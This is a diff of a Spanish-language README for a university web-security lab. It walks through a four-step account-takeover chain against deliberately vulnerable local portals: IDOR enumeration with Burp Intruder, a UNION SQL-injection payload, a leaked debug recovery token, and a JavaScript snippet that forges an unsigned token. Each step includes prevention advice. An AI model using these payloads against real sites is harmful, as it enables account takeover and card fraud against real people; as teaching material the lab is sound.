@@ -1,282 +1,314 @@
-# Fort Knox — TP Seguridad Web (K5061)
+# Fort Knox — Laboratorio de cadena de ataque
 
-Laboratorio de cadena de ataque sobre dos portales web vulnerables de una joyeria ficticia.
-UTN FRBA - Grupo 4 - 2026
+Trabajo Práctico de Seguridad en Aplicaciones Web · UTN FRBA (K5061) · Grupo 4 · 2026
 
----
+Dos portales web de una joyería ficticia, **Fort Knox**, conectados por una sesión
+compartida (SSO). Cada uno tiene vulnerabilidades que, encadenadas, permiten a un
+atacante pasar de tener una cuenta común a **tomar el control total de la cuenta de
+otra persona** y operar a su nombre.
 
-## Cadena de ataque
-
-```
-Paso 1 — A01: IDOR / BOLA          Portal de Seguimiento (5001)
-  GET /tracking?shipment_id=692
-  -> sin verificacion de ownership, devuelve datos del destinatario:
-     nombre + ID de cliente ofuscado de la victima (204815). Sin email.
-
-Paso 2 — A05: SQL Injection         Portal de Seguimiento (5001)
-  GET /support/search?user_id=204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
-  -> extrae el username de la victima: "carlos_gomez" (aparece en la columna Nombre)
-  (requiere cookie SSO del portal de clientes)
-
-Paso 3 — A02: Security Misconfiguration   Portal de Clientes (5000)
-  POST /account/recover  { username: "carlos_gomez" }
-  -> la respuesta incluye debug_token con el token de recuperacion en texto claro
-
-Paso 4 — A08: Token Tampering       Portal de Clientes (5000)
-  Decodifica el token (base64url JSON sin firma),
-  cambia authorized_email al email del atacante,
-  re-codifica y visita /account/confirm-recovery?token=<tampered>
-  -> acceso total a la cuenta de carlos_gomez
-```
+Todo el ataque se realiza **navegando con el browser** (más las herramientas de
+desarrollador F12 y, opcionalmente, Burp Suite para la fuerza bruta). No hace falta
+escribir requests a mano.
 
 ---
 
-## Estructura del proyecto
+## La cadena en una mirada
+
+| # | Vulnerabilidad | Portal | Qué obtiene el atacante |
+|---|----------------|--------|--------------------------|
+| 1 | IDOR / Broken Access Control | Seguimiento (5001) | Nombre + ID de cliente de la víctima |
+| 2 | SQL Injection | Seguimiento (5001) | Email de la víctima |
+| 3 | Security Misconfiguration | Clientes (5000) | Token de recuperación de cuenta |
+| 4 | Token Tampering (Data Integrity) | Clientes (5000) | Sesión activa como la víctima |
+| ★ | Impacto | Clientes (5000) | Tarjeta guardada, cambio de dirección, compras |
+
+Cada paso es **necesario**: sin el ID de cliente no podés apuntar la inyección, sin el
+email no podés pedir la recuperación, sin el token no hay toma de cuenta. El IDOR
+expone el ID pero **no** el email, así que el SQL Injection es obligatorio para
+conseguirlo.
+
+---
+
+## Los dos portales
 
 ```
 JoyeriaFortKnox/
-├── docker-compose.yml
-├── tracking/                   <- Portal de Seguimiento de Envios (puerto 5001)
+├── clientes/                   Portal de Clientes — http://localhost:5000
 │   ├── app.py
-│   ├── seed.py
+│   ├── seed.py                 crea y puebla clientes.db
 │   ├── requirements.txt
-│   ├── Dockerfile
-│   ├── tracking.db             <- generado por seed.py (no commitear)
 │   └── templates/
 │       ├── base.html
-│       ├── index.html          <- landing: busqueda publica por email
-│       ├── tracking.html       <- detalle de envio (VULNERABLE: IDOR A01)
-│       ├── support.html        <- busqueda interna por user_id (VULNERABLE: SQLi A05)
-│       └── login.html          <- pantalla sin cookie SSO
-└── clientes/                   <- Portal de Clientes (puerto 5000)
+│       ├── login.html
+│       ├── dashboard.html      "Mi cuenta": pedidos del cliente
+│       ├── profile.html        "Mi perfil": datos sensibles, tarjeta, compras
+│       ├── recover.html        formulario de recuperación de cuenta
+│       ├── recover_sent.html   confirmación de envío del mail
+│       └── confirm_recovery.html  procesa el token de recuperación
+│
+└── tracking/                   Portal de Seguimiento — http://localhost:5001
     ├── app.py
-    ├── seed.py
+    ├── seed.py                 crea y puebla tracking.db
     ├── requirements.txt
-    ├── Dockerfile
-    ├── clientes.db             <- generado por seed.py (no commitear)
     └── templates/
         ├── base.html
-        ├── login.html          <- login con usuario/password
-        ├── dashboard.html      <- pedidos del cliente
-        ├── recover.html        <- formulario de recuperacion
-        ├── recover_sent.html   <- VULNERABLE: A02, muestra debug_token
-        └── confirm_recovery.html <- VULNERABLE: A08, acepta token sin firma
+        ├── login.html          pantalla cuando falta la cookie SSO
+        ├── index.html          búsqueda de envíos por email (vector del SQLi)
+        └── tracking.html       detalle de un envío (vector del IDOR)
 ```
 
----
-
-## Bases de datos
-
-Cada portal tiene su propia base de datos SQLite independiente, generada por su `seed.py`.
-
-### clientes/clientes.db
-
-| Tabla    | Campos clave                                                                     |
-|----------|----------------------------------------------------------------------------------|
-| `users`  | id, username, **password** (texto claro), email, first_name, last_name          |
-| `orders` | id, user_id (FK), order_number, product_name, amount, status, created_at        |
-
-### tracking/tracking.db
-
-| Tabla       | Campos clave                                                                          |
-|-------------|---------------------------------------------------------------------------------------|
-| `users`     | id, username, email, first_name, last_name (**sin password**)                        |
-| `shipments` | id, shipment_id (unico), user_id (FK), order_number, status, destination, estimated_delivery |
-
-> Los usernames son iguales en ambas DBs (`carlos_gomez`, `attacker`, etc.) — esto es lo que permite el SSO compartido.
+Material de apoyo en la raíz: `ataque.html` (diagrama visual de la cadena),
+`como_probar.txt` (guía rápida) y `bruteforce_shipment.py` (script opcional de
+fuerza bruta).
 
 ---
 
-## Requisitos
+## Cómo levantar el laboratorio
 
-- Python 3.10+ **o** Docker + Docker Compose
+Requisitos: **Python 3.10+** y **Flask** (`python -m pip install flask`).
 
----
+Cada portal corre en su propia terminal. Conviene arrancar primero el de clientes.
 
-## Correr los portales
+**Terminal 1 — Portal de Clientes (puerto 5000)**
 
-### Opcion A — Docker (recomendado)
-
-Levanta ambos portales de una sola vez. Cada contenedor corre `seed.py` al arrancar.
-
-```bash
-docker compose up --build
 ```
-
-- Portal de Clientes    -> http://localhost:5000
-- Portal de Seguimiento -> http://localhost:5001
-
-### Opcion B — Local (dos terminales)
-
-**Terminal 1 — Portal de Clientes (arrancar primero)**
-
-```bash
 cd clientes
-
-python -m pip install flask    # solo la primera vez
-python seed.py                 # solo la primera vez — crea clientes/clientes.db
-python app.py                  # inicia en http://localhost:5000
+python -m pip install flask     (solo la primera vez)
+python seed.py                  (solo la primera vez — crea clientes.db)
+python app.py
 ```
 
-**Terminal 2 — Portal de Seguimiento**
+**Terminal 2 — Portal de Seguimiento (puerto 5001)**
 
-```bash
+```
 cd tracking
-
-python -m pip install flask    # solo la primera vez
-python seed.py                 # solo la primera vez — crea tracking/tracking.db
-python app.py                  # inicia en http://localhost:5001
+python -m pip install flask     (solo la primera vez)
+python seed.py                  (solo la primera vez — crea tracking.db)
+python app.py
 ```
 
----
+Con ambos corriendo, el laboratorio queda en:
 
-## Ejecutar el ataque (paso a paso)
+- Portal de Clientes → http://localhost:5000
+- Portal de Seguimiento → http://localhost:5001
 
-### Setup: el atacante se loguea en su propia cuenta
-
-```
-http://localhost:5000/login
-  usuario:    attacker
-  contrasena: FK2026!
-```
-
-Esto crea la cookie SSO `fk_session` que tambien es valida en el portal de seguimiento.
-
----
-
-### Paso 1 — IDOR: ver el envio de la victima
-
-El atacante recibio el link de su propio envio:
-```
-http://localhost:5001/tracking?shipment_id=666
-```
-
-Prueba otros IDs por fuerza bruta (barrido desde 666 hacia arriba) y encuentra el de la victima:
-```
-http://localhost:5001/tracking?shipment_id=692
-```
-
-**Resultado:** el servidor devuelve los datos de Carlos Gomez sin verificar ownership.
-
-| Campo         | Valor obtenido    |
-|---------------|-------------------|
-| Nombre        | Carlos Gomez      |
-| ID de cliente | `204815`          |
-| Orden         | ORD-2026-1001     |
-
-> El detalle del envio **no expone el email** del cliente — solo el ID de cliente
-> (ofuscado, no enumerable). Ese ID es el dato que habilita el Paso 2.
-
-**Por que funciona:** el endpoint valida el token SSO pero no compara el `user_id` del envio
-con el `user_id` de la sesion activa. Solo busca en la DB por `shipment_id`.
-
----
-
-### Paso 2 — SQL Injection: extraer el username
-
-Con el `ID de cliente: 204815` obtenido en el paso anterior, el atacante va al buscador interno de soporte:
-
-Consulta normal:
-```
-http://localhost:5001/support/search?user_id=204815
-```
-Devuelve: ID=204815, Nombre=Carlos, Apellido=Gomez (sin email ni username)
-
-Ahora inyecta en el parametro `user_id`:
-```
-204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
-```
-
-URL completa:
-```
-http://localhost:5001/support/search?user_id=204815 UNION SELECT id,username,last_name FROM users WHERE id=204815--
-```
-
-**Resultado:** aparece una segunda fila con `carlos_gomez` en la columna **Nombre**.
-
-**Por que funciona:** el backend concatena el parametro directamente en la query:
-```python
-query = f"SELECT u.id, u.first_name, u.last_name FROM users WHERE u.id = {user_id}"
-```
-El `UNION SELECT` se ejecuta como SQL valido. No hay passwords en esta tabla,
-la inyeccion solo expone el username — suficiente para el paso siguiente.
-
----
-
-### Paso 3 — A02: obtener el token de recuperacion
-
-El atacante pide recuperacion para la cuenta de Carlos:
-```
-POST http://localhost:5000/account/recover
-  username=carlos_gomez
-```
-
-**Resultado:** la respuesta HTML incluye un bloque de debug con el token en claro:
-```
-[DEBUG] recovery_token: eyJ1c2VyIjogImNhcmxvc19nb21leiIsICJhdXRob3JpemVkX2VtYWls...
-```
-
-**Por que funciona:** el desarrollador dejo un campo de debug en la respuesta.
-En produccion, ese token solo deberia enviarse por email al dueno de la cuenta.
-
----
-
-### Paso 4 — A08: tamper del token -> acceso total
-
-El token es JSON codificado en base64url, sin ninguna firma ni HMAC.
-
-Decodificar:
-```
-base64url.decode(token)
--> {"user": "carlos_gomez", "authorized_email": "carlos.gomez@gmail.com", "exp": "..."}
-```
-
-Cambiar `authorized_email` al email del atacante y re-codificar:
-```
-{"user": "carlos_gomez", "authorized_email": "attacker@mailinator.com", "exp": "..."}
--> <nuevo_token_base64>
-```
-
-Visitar la URL de confirmacion con el token modificado:
-```
-http://localhost:5000/account/confirm-recovery?token=<nuevo_token_base64>
-```
-
-**Resultado:** el servidor acepta el token, actualiza el email de Carlos al del atacante,
-y abre sesion como `carlos_gomez`. Acceso total a la cuenta de la victima.
-
-**Por que funciona:** el endpoint decodifica el base64 sin verificar ninguna firma:
-```python
-payload = json.loads(base64.urlsafe_b64decode(token))  # sin HMAC check
-```
+> **Resetear entre pruebas:** el ataque modifica datos (email, dirección, pedidos).
+> Para volver al estado inicial, frená las apps, volvé a correr `python seed.py` en
+> cada carpeta y arrancá de nuevo. Útil para repetir la demo o regrabar el video.
 
 ---
 
 ## Usuarios de prueba
 
-### Portal de Clientes (clientes.db)
+**Portal de Clientes** (todos con contraseña `FK2026!`)
 
-| Usuario        | Password | Email                    | Rol      |
-|----------------|----------|--------------------------|----------|
-| `carlos_gomez` | FK2026!  | carlos.gomez@gmail.com   | Victima  |
-| `ana_martinez` | FK2026!  | ana.martinez@hotmail.com | —        |
-| `lucia_perez`  | FK2026!  | lucia.perez@yahoo.com    | —        |
-| `attacker`     | FK2026!  | attacker@mailinator.com  | Atacante |
+| Usuario | Rol | ID de cliente | Nº de envío |
+|---------|-----|---------------|-------------|
+| `carlos_gomez` | Víctima | 204815 | 692 |
+| `ana_martinez` | — | 119273 | 759 |
+| `lucia_perez` | — | 387640 | 481 |
+| `attacker` | Atacante | 256108 | 666 |
 
-### Portal de Seguimiento (tracking.db)
-
-| Usuario        | Email                    | ID de cliente | shipment_id | Rol      |
-|----------------|--------------------------|---------------|-------------|----------|
-| `carlos_gomez` | carlos.gomez@gmail.com   | 204815        | 692         | Victima  |
-| `ana_martinez` | ana.martinez@hotmail.com | 119273        | 759         | —        |
-| `lucia_perez`  | lucia.perez@yahoo.com    | 387640        | 481         | —        |
-| `attacker`     | attacker@mailinator.com  | 256108        | 666         | Atacante |
+El atacante es un cliente legítimo de la joyería: tiene su propia cuenta y su propio
+envío (`666`). A partir de ahí ataca a Carlos.
 
 ---
 
-## Mecanismo SSO
+# Ejecución del ataque (paso a paso)
 
-Ambos portales comparten `secret_key = 'fortknox-sso-shared-secret-2026'`
-y el nombre de cookie `fk_session`. Los navegadores envian cookies de `localhost`
-sin distinguir por puerto, por lo que la sesion creada al loguearse en el puerto 5000
-es automaticamente valida en el portal de seguimiento en el puerto 5001.
+Todo se hace en el navegador. Donde dice "abrí", navegás a esa dirección en la barra
+del browser.
+
+## Paso 0 — Iniciar sesión como atacante
+
+Abrí el Portal de Clientes e iniciá sesión con la cuenta propia del atacante:
+
+```
+http://localhost:5000/login
+   usuario:     attacker
+   contraseña:  FK2026!
+```
+
+Esto crea la cookie de sesión `fk_session`. Como ambos portales comparten la misma
+clave secreta y el mismo nombre de cookie, **esa sesión también es válida en el
+portal de seguimiento** (puerto 5001) sin volver a iniciar sesión.
+
+---
+
+## Paso 1 — IDOR: ver el envío de otra persona
+
+El atacante conoce el número de su propio envío. Abrilo:
+
+```
+http://localhost:5001/tracking?shipment_id=666
+```
+
+Muestra los datos del envío del atacante. La clave: el portal **no verifica que el
+envío te pertenezca**. Cambiando el número se accede a envíos ajenos. Probá subiendo
+desde el propio número hasta encontrar uno válido:
+
+```
+http://localhost:5001/tracking?shipment_id=692
+```
+
+Aparecen los datos del destinatario sin ser el dueño del envío:
+
+| Dato | Valor |
+|------|-------|
+| Nombre | Carlos Gomez |
+| ID de cliente | **204815** |
+| Orden | ORD-2026-1001 |
+
+El detalle **no muestra el email** — solo el ID de cliente, que es lo que habilita el
+Paso 2.
+
+### Automatizar la búsqueda con Burp Suite (recomendado para la demo)
+
+Los números no son consecutivos, así que conviene enumerarlos. Un envío que existe
+devuelve **200**; uno inexistente devuelve **404**. Ese contraste delata los válidos.
+
+1. Capturá en Burp la request a `/tracking?shipment_id=666` (con la cookie `fk_session`).
+2. Mandala a **Intruder** y marcá el número como posición de payload.
+3. En **Payloads** → tipo **Numbers** → From `666`, To `999`, Step `1`
+   (Max integer digits `3`).
+4. **Start attack** y ordená por **Status code**: los `200` (envíos reales) saltan
+   entre los `404`. Subiendo desde 666, el primero ajeno es `692`.
+
+> **Por qué funciona:** el endpoint valida que haya sesión, pero no compara el dueño
+> del envío con el usuario de la sesión. **Prevención:** verificar ownership del
+> recurso (que el `shipment_id` pertenezca al usuario autenticado) antes de devolverlo.
+
+---
+
+## Paso 2 — SQL Injection: obtener el email
+
+El portal de seguimiento te deja buscar tus envíos por email. Abrí la página principal:
+
+```
+http://localhost:5001/
+```
+
+Ese buscador es vulnerable a inyección SQL. El atacante todavía **no tiene el email**
+de la víctima (el Paso 1 solo le dio el ID de cliente), así que lo inyecta para
+extraerlo usando ese ID. Pegá esto en el campo de búsqueda y confirmá:
+
+```
+' UNION SELECT email,'-','-','-','-' FROM users WHERE id=204815--
+```
+
+La grilla muestra una fila donde la columna **Nro. de envío** contiene el email de la
+víctima: **`carlos.gomez@gmail.com`**. (Los datos aparecen en columnas que no
+corresponden — esa "UI rota" es justamente la señal de la inyección.)
+
+> **Por qué funciona:** el backend arma la consulta pegando el texto del campo
+> directamente, sin separarlo de la instrucción SQL. **Prevención:** usar consultas
+> parametrizadas (placeholders `?`), nunca concatenar entrada del usuario.
+
+---
+
+## Paso 3 — Security Misconfiguration: capturar el token de recuperación
+
+Ya con el email, el atacante pide recuperar la cuenta de Carlos. Abrí:
+
+```
+http://localhost:5000/account/recover
+```
+
+Ingresá el email `carlos.gomez@gmail.com` y enviá. La pantalla solo dice que se mandó
+un mail a ese correo — el atacante **no tiene acceso al buzón de la víctima**. Pero el
+servidor filtra el token en la propia respuesta:
+
+1. Antes de enviar el formulario, abrí las herramientas de desarrollador con **F12**.
+2. Andá a la pestaña **Network** (Red) y tildá **Preserve log** (Conservar registro).
+3. Ingresá `carlos_gomez` y enviá el formulario.
+4. En la lista, hacé clic en la entrada **`recover`**.
+5. Abrí la pestaña **Headers** y bajá a **Response Headers**.
+6. Ahí está el token, en texto plano:
+   ```
+   X-Debug-Token: eyJ1c2VyIjogImNhcmxvc19nb21leiIs...
+   ```
+7. Copiá ese valor.
+
+> **Por qué funciona:** quedó un encabezado de debug que expone el token de recuperación
+> en la respuesta. **Prevención:** el token solo debe viajar por el canal seguro previsto
+> (el email del dueño), nunca en la respuesta; quitar artefactos de debug antes de
+> publicar.
+
+---
+
+## Paso 4 — Token Tampering: tomar el control de la cuenta
+
+El token es un JSON codificado en Base64URL **sin ninguna firma**. Su contenido es:
+
+```
+{ "user": "carlos_gomez", "authorized_email": "carlos.gomez@gmail.com", "exp": "..." }
+```
+
+El atacante lo decodifica, le cambia `authorized_email` por su propio correo, lo vuelve
+a codificar y visita la confirmación con el token modificado. Como el servidor no
+verifica integridad, lo acepta.
+
+La forma más limpia de hacerlo en vivo es desde la consola del navegador:
+
+1. Quedate en una pestaña de `localhost:5000`.
+2. Abrí **F12** → pestaña **Console**.
+3. Pegá esto, reemplazando `PEGA_EL_TOKEN_ACA` con el token del Paso 3:
+
+```js
+const token = "PEGA_EL_TOKEN_ACA";
+// 1. decodificar Base64URL -> JSON
+const b64 = token.replace(/-/g,'+').replace(/_/g,'/');
+const payload = JSON.parse(atob(b64 + "=".repeat((4 - b64.length % 4) % 4)));
+console.log("Token original:", payload);
+// 2. cambiar el email autorizado por el del atacante
+payload.authorized_email = "attacker@mailinator.com";
+console.log("Token modificado:", payload);
+// 3. re-codificar a Base64URL (sin padding)
+const tampered = btoa(JSON.stringify(payload))
+  .replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,'');
+// 4. navegar a la confirmación con el token alterado
+location.href = "http://localhost:5000/account/confirm-recovery?token=" + tampered;
+```
+
+4. Enter. El navegador navega solo y muestra "acceso concedido": **quedás con la sesión
+   iniciada como `carlos_gomez`**, con el email de la cuenta cambiado al del atacante.
+
+> **Por qué funciona:** Base64 es codificación, no cifrado — cualquiera lo decodifica,
+> edita y recodifica. Sin una firma que el servidor valide, no hay forma de detectar
+> que el token fue alterado. **Prevención:** firmar el token (HMAC/JWT con secreto) y
+> verificar la firma antes de procesarlo.
+
+---
+
+## Paso ★ — Impacto: qué puede hacer el atacante adentro
+
+Ya dentro de la cuenta de Carlos, en la navbar hacé clic en **Mi perfil**:
+
+```
+http://localhost:5000/profile
+```
+
+Desde ahí el atacante puede:
+
+- **Ver datos sensibles:** teléfono, dirección y la **tarjeta de pago guardada**
+  (`Visa ···· 4821`). El email ya figura como el del atacante (lo cambió el Paso 4),
+  mientras la tarjeta y la dirección siguen siendo de Carlos: está claramente dentro
+  de la cuenta real de la víctima.
+- **Cambiar la dirección de envío** a la suya — los próximos pedidos se entregan donde
+  él diga.
+- **Comprar con un clic** usando la tarjeta de la víctima. La compra queda registrada
+  en la cuenta de Carlos y se envía a la dirección que el atacante puso.
+
+Esto convierte la toma de cuenta en daño concreto: fraude con la tarjeta de la víctima
+y mercadería desviada al atacante.
+
+---
+
+## Cómo funciona el SSO compartido
+
+Ambos portales usan la **misma clave secreta** de sesión y el **mismo nombre de cookie**
+(`fk_session`). Los navegadores envían las cookies de `localhost` sin distinguir el
+puerto, así que la sesión creada al iniciar sesión en el portal de clientes (5000) es
+automáticamente válida en el de seguimiento (5001). Por eso el atacante inicia sesión
+una sola vez (Paso 0) y queda habilitado en ambos.
